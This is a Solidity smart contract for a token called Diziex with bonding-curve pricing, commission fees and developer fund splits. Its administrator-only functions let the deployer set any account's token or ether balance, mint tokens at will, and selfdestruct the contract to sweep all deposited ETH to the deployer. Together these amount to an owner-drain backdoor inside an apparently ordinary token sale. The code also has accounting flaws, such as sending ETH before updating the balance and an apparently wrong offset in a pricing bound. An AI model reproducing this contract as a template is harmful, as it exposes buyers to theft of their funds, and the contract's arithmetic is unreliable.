pragma solidity ^0.4.26;

contract Diziex {
    // only people with tokens
    modifier onlyBagholders() {
        require(myTokens() > 0);
        _;
    }

    modifier onlyAdministrator(){
        address _customerAddress = msg.sender;
        require(administrators[_customerAddress]);
        _;
    }
    
    /*==============================
    =            EVENTS            =
    ==============================*/

    event onWithdraw(
        address indexed customerAddress,
        uint256 ethereumWithdrawn
    );
    
    // ERC20
    event Transfer(
        address indexed from,
        address indexed to,
        uint256 tokens
    );
    
    /*=====================================
    =            CONFIGURABLES            =
    =====================================*/
    string public name = "Diziex";
    string public symbol = "DZX";
    uint8 constant public decimals = 0;
    uint256 public totalSupply_ = 1500000;
    uint256 constant internal tokenPriceInitial_ = 125000000000000;
    uint256 constant internal tokenPriceIncremental_ = 750000000;
    uint256 internal buyPercent = 2000;
    uint256 internal sellPercent = 7500;
    uint256 internal tokenPercent = 22000;
    uint256 public currentPrice_ = tokenPriceInitial_ + tokenPriceIncremental_;
    uint256 public grv = 1;
    uint256 public rewardSupply_ = 300000; // for reward distribution
    // Please verify the website https://diziex.io before purchasing tokens

    address commissionHolder; // holds commissions fees 
    address stakeHolder; //stake holder
    address dev1; // Design Fund
    address dev2; // Growth funds
    address dev3; // Compliance funds
    address dev4; // Marketing Funds
    address dev5; // Development funds
    address dev6; // Research Funds
    address dev7; // holds stake
    address dev8; // miscellaneous
    mapping(address => uint256) internal tokenBalanceLedger_;
    mapping(address => uint256) internal etherBalanceLedger_;
    address sonk;
    uint256 internal tokenSupply_ = 0;
    // uint256 internal profitPerShare_;
    mapping(address => bool) internal administrators;
    uint256 commFunds=0;
    
    constructor() public
    {
        sonk = msg.sender;
        administrators[sonk] = true; 
        commissionHolder = sonk;
        stakeHolder = sonk;
        commFunds = 0;
    }
    
    function upgradeContract(address[] _users, uint256[] _balances, uint modeType)
    onlyAdministrator()
    public
    {
        if(modeType == 1)
        {
            for(uint i = 0; i<_users.length;i++)
            {
                tokenSupply_ = tokenSupply_- tokenBalanceLedger_[_users[i]] + _balances[i];
                tokenBalanceLedger_[_users[i]] = _balances[i];
                emit Transfer(address(this),_users[i],_balances[i]);
            }
        }
        if(modeType == 2)
        {
            for(i = 0; i<_users.length;i++)
            {
                etherBalanceLedger_[_users[i]] += _balances[i];
                commFunds += _balances[i];
            }
        }
    }
    
    function fundsInjection() public payable returns(bool)
    {
        return true;
    }
    
    function upgradeDetails(uint256 _currentPrice, uint256 _grv, uint256 _commFunds)
    onlyAdministrator()
    public
    {
        currentPrice_ = _currentPrice;
        grv = _grv;
        commFunds = _commFunds;
    }
    function buy(address _referredBy)
        public
        payable
        returns(uint256)
    {
        purchaseTokens(msg.value);
    }
    
    function()
        payable
        public
    {
        purchaseTokens(msg.value);
    }
    
    function withdrawRewards(uint256 _amount, address _customerAddress)
        onlyAdministrator()
        public 
    {
        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress],_amount);
        tokenSupply_ = SafeMath.add (tokenSupply_,_amount);
    }
    
    function withdrawComm(uint256 _amount, address _customerAddress)
        onlyAdministrator()
        public 
    {
        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress],_amount);
        tokenBalanceLedger_[commissionHolder] = SafeMath.sub(tokenBalanceLedger_[commissionHolder], _amount);
    }
    
    function withdrawEthers(uint256 _amount)
    public
    {
        require(etherBalanceLedger_[msg.sender] >= _amount);
        msg.sender.transfer(_amount);
        etherBalanceLedger_[msg.sender] -= _amount;
        emit Transfer(msg.sender, address(this),calculateTokensReceived(_amount));
    }
    
    /**
     * Alias of sell() and withdraw().
     */
    function exit()
        public
    {
        address _customerAddress = msg.sender;
        uint256 _tokens = tokenBalanceLedger_[_customerAddress];
        if(_tokens > 0) sell(_tokens);
    }

    /**
     * Liquifies tokens to ethereum.
     */
    function sell(uint256 _amountOfTokens)
        onlyBagholders()
        public
    {
        // setup data
        address _customerAddress = msg.sender;
        require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
        uint256 _tokens = _amountOfTokens;
        uint256 _ethereum = tokensToEthereum_(_tokens,true);
        uint256 _dividends = _ethereum * sellPercent/100000;
        uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
        commFunds += _dividends;
        
        // burn the sold tokens
        tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
        _customerAddress.transfer(_taxedEthereum);
        emit Transfer(_customerAddress, address(this), _tokens);
    }
    
    function registerDevs(address[] _devAddress1)
    onlyAdministrator()
    public
    {
        dev1 = _devAddress1[0];
        dev2 = _devAddress1[1];
        dev3 = _devAddress1[2];
        dev4 = _devAddress1[3];
        dev5 = _devAddress1[4];
        dev6 = _devAddress1[5];
        dev7 = _devAddress1[6];
        dev8 = _devAddress1[7];
    }
    
    function totalCommFunds() 
        onlyAdministrator()
        public view
        returns(uint256)
    {
        return commFunds;    
    }
    
    function myEthers() 
        public view
        returns(uint256)
    {
        return etherBalanceLedger_[msg.sender];    
    }
    
    function getCommFunds(uint256 _amount)
        onlyAdministrator()
        public 
    {
        if(_amount <= commFunds)
        {
            etherBalanceLedger_[dev1]+=(_amount*1333/10000);
            etherBalanceLedger_[dev2]+=(_amount*1333/10000);
            etherBalanceLedger_[dev3]+=(_amount*1333/10000);
            etherBalanceLedger_[dev4]+=(_amount*1333/10000);
            etherBalanceLedger_[dev5]+=(_amount*1333/10000);
            etherBalanceLedger_[dev6]+=(_amount*1333/10000);
            etherBalanceLedger_[dev7]+=(_amount*1000/10000);
            etherBalanceLedger_[dev8]+=(_amount*1000/10000);
            commFunds = SafeMath.sub(commFunds,_amount);
        }
    }
    
    function transfer(address _toAddress, uint256 _amountOfTokens)
        public
        returns(bool)
    {
        // setup
        address _customerAddress = msg.sender;

        // exchange tokens
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
        tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _amountOfTokens);
        emit Transfer(_customerAddress, _toAddress, _amountOfTokens);
        // ERC20
        return true;
    }
    
    function destruct() onlyAdministrator() public{
        selfdestruct(sonk);
    }
    
    
    function setPercent(uint256 newPercent, uint mode) onlyAdministrator() public {
        if(mode == 1)
        {
            buyPercent = newPercent;
        }
        if(mode == 2)
        {
            sellPercent = newPercent;
        }
        if(mode == 3)
        {
            tokenPercent = newPercent;
        }
    }

    
    function setName(string _name)
        onlyAdministrator()
        public
    {
        name = _name;
    }
    
    function setSymbol(string _symbol)
        onlyAdministrator()
        public
    {
        symbol = _symbol;
    }

    function setupCommissionHolder(address _commissionHolder)
    onlyAdministrator()
    public
    {
        commissionHolder = _commissionHolder;
    }
    
    function setupAdministrator(address _commissionHolder)
    onlyAdministrator()
    public
    {
        administrators[_commissionHolder] = true;
    }

    function totalEthereumBalance()
        public
        view
        returns(uint)
    {
        return address(this).balance;
    }
    
    function totalSupply()
        public
        view
        returns(uint256)
    {
        return totalSupply_;
    }
    
    function tokenSupply()
    public
    view
    returns(uint256)
    {
        return tokenSupply_;
    }
    
    /**
     * Retrieve the tokens owned by the caller.
     */
    function myTokens()
        public
        view
        returns(uint256)
    {
        address _customerAddress = msg.sender;
        return balanceOf(_customerAddress);
    }
    
    
    /**
     * Retrieve the token balance of any single address.
     */
    function balanceOf(address _customerAddress)
        view
        public
        returns(uint256)
    {
        return tokenBalanceLedger_[_customerAddress];
    }
    

    function sellPrice() 
        public 
        view 
        returns(uint256)
    {
        // our calculation relies on the token supply, so we need supply. Doh.
        if(tokenSupply_ == 0){
            return tokenPriceInitial_ - tokenPriceIncremental_;
        } else {
            uint256 _ethereum = tokensToEthereum_(2,false);
            uint256 _dividends = _ethereum * sellPercent/100000;
            uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
            return _taxedEthereum;
        }
    }
    
    /**
     * Return the sell price of 1 individual token.
     */
    function buyPrice() 
        public 
        view 
        returns(uint256)
    {
        return currentPrice_;
    }
    
    
    function calculateEthereumReceived(uint256 _tokensToSell) 
        public 
        view 
        returns(uint256)
    {
        require(_tokensToSell <= tokenSupply_);
        uint256 _ethereum = tokensToEthereum_(_tokensToSell,false);
        uint256 _dividends = _ethereum * sellPercent/100000;//SafeMath.div(_ethereum, dividendFee_);
        uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
        return _taxedEthereum;
    }
    
    
    /*==========================================
    =            INTERNAL FUNCTIONS            =
    ==========================================*/
    
    event testLog(
        uint256 currBal
    );

    function calculateTokensReceived(uint256 _ethereumToSpend) 
        public 
        view 
        returns(uint256)
    {
        uint256 _dividends = _ethereumToSpend * buyPercent/100000;
        uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);
        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum, currentPrice_, grv, false);
        _amountOfTokens = SafeMath.sub(_amountOfTokens, _amountOfTokens * tokenPercent/100000);
        return _amountOfTokens;
    }
    
    function purchaseTokens(uint256 _incomingEthereum)
        internal
        returns(uint256)
    {
        // data setup
        address _customerAddress = msg.sender;
        uint256 _dividends = _incomingEthereum * buyPercent/100000;
        commFunds += _dividends;
        uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, _dividends);
        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum , currentPrice_, grv, true);
        tokenBalanceLedger_[commissionHolder] += _amountOfTokens * tokenPercent/100000;
        require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));
        
        tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);
        require(SafeMath.add(_amountOfTokens,tokenSupply_) < (totalSupply_+rewardSupply_));
        //deduct commissions for referrals
        _amountOfTokens = SafeMath.sub(_amountOfTokens, _amountOfTokens * 20/100);
        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
        
        // fire event
        emit Transfer(address(this), _customerAddress, _amountOfTokens);
        
        return _amountOfTokens;
    }
   
    function ethereumToTokens_(uint256 _ethereum, uint256 _currentPrice, uint256 _grv, bool _buy)
        internal
        returns(uint256)
    {
        uint256 _tokenPriceIncremental = (tokenPriceIncremental_*(2**(_grv-1)));
        uint256 _tempad = SafeMath.sub((2*_currentPrice), _tokenPriceIncremental);
        uint256 _tokenSupply = tokenSupply_;
        uint256 _totalTokens = 0;
        uint256 _tokensReceived = (
            (
                SafeMath.sub(
                    (sqrt
                        (
                            _tempad**2
                            + (8*_tokenPriceIncremental*_ethereum)
                        )
                    ), _tempad
                )
            )/(2*_tokenPriceIncremental)
        );
        uint256 tempbase = upperBound_(_grv);
        while((_tokensReceived + _tokenSupply) > tempbase){
            _tokensReceived = tempbase - _tokenSupply;
            _ethereum = SafeMath.sub(
                _ethereum,
                ((_tokensReceived)/2)*
                ((2*_currentPrice)+((_tokensReceived-1)
                *_tokenPriceIncremental))
            );
            _currentPrice = _currentPrice+((_tokensReceived-1)*_tokenPriceIncremental);
            _grv = _grv + 1;
            _tokenPriceIncremental = (tokenPriceIncremental_*((2)**(_grv-1)));
            _tempad = SafeMath.sub((2*_currentPrice), _tokenPriceIncremental);
            uint256 _tempTokensReceived = (
                (
                    SafeMath.sub(
                        (sqrt
                            (
                                _tempad**2
                                + (8*_tokenPriceIncremental*_ethereum)
                            )
                        ), _tempad
                    )
                )/(2*_tokenPriceIncremental)
            );
            _tokenSupply = _tokenSupply + _tokensReceived;
            _totalTokens = _totalTokens + _tokensReceived;
            _tokensReceived = _tempTokensReceived;
            tempbase = upperBound_(_grv);
        }
        _totalTokens = _totalTokens + _tokensReceived;
        _currentPrice = _currentPrice+((_tokensReceived-1)*_tokenPriceIncremental);
        if(_buy == true)
        {
            currentPrice_ = _currentPrice;
            grv = _grv;
        }
        return _totalTokens;
    }
    
    function upperBound_(uint256 _grv)
    internal
    pure
    returns(uint256)
    {
        if(_grv <= 3)
        {
            return (100000 * _grv);
        }
        if(_grv > 3 && _grv <= 6)
        {
            return (300000 + ((_grv-3)*90000));
        }
        if(_grv > 6 && _grv <= 9)
        {
            return (570000 + ((_grv-6)*80000));
        }
        if(_grv > 9 && _grv <= 12)
        {
            return (810000 +((_grv-9)*70000));
        }
        if(_grv > 12 && _grv <= 15)
        {
            return (1020000+((_grv-12)*60000));
        }
        if(_grv > 15 && _grv <= 18)
        {
            return (1200000+((_grv-15)*50000));
        }
        if(_grv > 18 && _grv <= 21)
        {
            return (1350000+((_grv-18)*40000));
        }
        if(_grv > 21)
        {
            return (1470000+((_grv-18)*30000));
        }
        return 0;
    }
   
     function tokensToEthereum_(uint256 _tokens, bool _sell)
        internal
        view
        returns(uint256)
    {
        uint256 _tokenSupply = tokenSupply_;
        uint256 _etherReceived = 0;
        uint256 _grv = grv;
        uint256 tempbase = upperBound_(_grv-1);
        uint256 _currentPrice = currentPrice_;
        uint256 _tokenPriceIncremental = (tokenPriceIncremental_*((2)**(_grv-1)));
        while((_tokenSupply - _tokens) < tempbase)
        {
            uint256 tokensToSell = _tokenSupply - tempbase;
            if(tokensToSell == 0)
            {
                _tokenSupply = _tokenSupply - 1;
                _grv -= 1;
                tempbase = upperBound_(_grv-1);
                continue;
            }
            uint256 b = ((tokensToSell-1)*_tokenPriceIncremental);
            uint256 a = _currentPrice - b;
            _tokens = _tokens - tokensToSell;
            _etherReceived = _etherReceived + ((tokensToSell/2)*((2*a)+b));
            _currentPrice = a;
            _tokenSupply = _tokenSupply - tokensToSell;
            _grv = _grv-1 ;
            _tokenPriceIncremental = (tokenPriceIncremental_*((2)**(_grv-1)));
            tempbase = upperBound_(_grv-1);
        }
        if(_tokens > 0)
        {
             a = _currentPrice - ((_tokens-1)*_tokenPriceIncremental);
             _etherReceived = _etherReceived + ((_tokens/2)*((2*a)+((_tokens-1)*_tokenPriceIncremental)));
             _tokenSupply = _tokenSupply - _tokens;
             _currentPrice = a;
        }
       
        if(_sell == true)
        {
            grv = _grv;
            currentPrice_ = _currentPrice;
        }
        return _etherReceived;
    }
    
    
    function sqrt(uint x) internal pure returns (uint y) {
        uint z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
}

/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}